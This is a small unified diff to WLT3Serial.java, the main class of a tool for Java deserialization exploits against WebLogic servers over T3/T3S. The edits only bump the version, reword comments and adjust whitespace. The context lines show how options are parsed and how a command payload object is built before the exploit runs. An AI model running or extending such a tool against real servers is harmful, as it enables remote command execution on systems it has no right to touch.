@@ -1,7 +1,7 @@
 /*
 	WLT3Serial.java
 	
-	v0.1 (11/25/2017)
+	v0.2 ()
 	
 	Main class for executing java deserialization exploit against WebLogic Servers hosting a T3 or T3S listener. Parses command options then executes exploit with those options.
 */
@@ -91,7 +91,7 @@ public class WLT3Serial {
 							}
 							break;
 						case "--t3s": //use T3S connection
-						case "--t3s=TLSv1.2": //use T3S connect with TLSv1.2
+						case "--t3s=TLSv1.2": //use T3S to connect with TLSv1.2
 							if(!tlsSet) {
 								t3s = true;
 								System.setProperty("jdk.tls.client.protocols","TLSv1.2");
@@ -102,7 +102,7 @@ public class WLT3Serial {
 								return;
 							}
 							break;
-						case "--t3s=TLSv1.1": //use T3S connect with TLSv1.1
+						case "--t3s=TLSv1.1": //use T3S to connect with TLSv1.1
 							if(!tlsSet) {
 								t3s = true;
 								System.setProperty("jdk.tls.client.protocols","TLSv1.1");
@@ -113,7 +113,7 @@ public class WLT3Serial {
 								return;
 							}
 							break;
-						case "--t3s=TLSv1": //use T3S connect with TLSv1
+						case "--t3s=TLSv1": //use T3S to connect with TLSv1
 							if(!tlsSet) {
 								t3s = true;
 								System.setProperty("jdk.tls.client.protocols","TLSv1");
@@ -141,7 +141,7 @@ public class WLT3Serial {
 			}
 			final ObjectPayload payload = payloadClass.newInstance();
 			final Object object = payload.getObject(command);
-		
+			
 			//run exploit
 			System.out.print("\nConnecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port)+": ... ");
 			switch(method) {
